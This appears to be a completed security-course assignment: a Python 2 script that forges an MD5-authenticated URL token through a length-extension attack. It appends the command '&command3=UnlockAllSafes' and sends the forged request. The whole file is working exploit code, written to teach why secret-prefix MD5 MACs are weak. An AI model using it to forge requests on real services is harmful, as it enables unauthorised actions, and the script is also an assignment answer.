import httplib, urlparse, sys
from pymd5 import md5, padding
from urllib import quote
url = sys.argv[1]

# Your code to modify url goes here
# Extract token from given URL
tokenBegin = url.find('token=')
tokenBegin += 6
tokenEnd = url.find('&user=')

originalToken = url[tokenBegin:tokenEnd]
tokenEnd += 1

# Get length of the plaintext that generated the original token
# Formula is 8-character password + length of substring starting with "user=..."
originalPlaintextLength = 8 + len(url[tokenEnd:])

# Calculating padded message length
bits = (originalPlaintextLength + len(padding(originalPlaintextLength * 8))) * 8

# Setting MD5 state to original token and using padded message length as count
h = md5(state = originalToken.decode("hex"), count = bits)

# Performing length extension attack
extension = "&command3=UnlockAllSafes"
h.update(extension)

# Replacing old token with new forged token and appending padding and command
newUrl = url.replace(originalToken, h.hexdigest())
newUrl = newUrl + quote(padding(originalPlaintextLength * 8)) + extension
url = newUrl

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
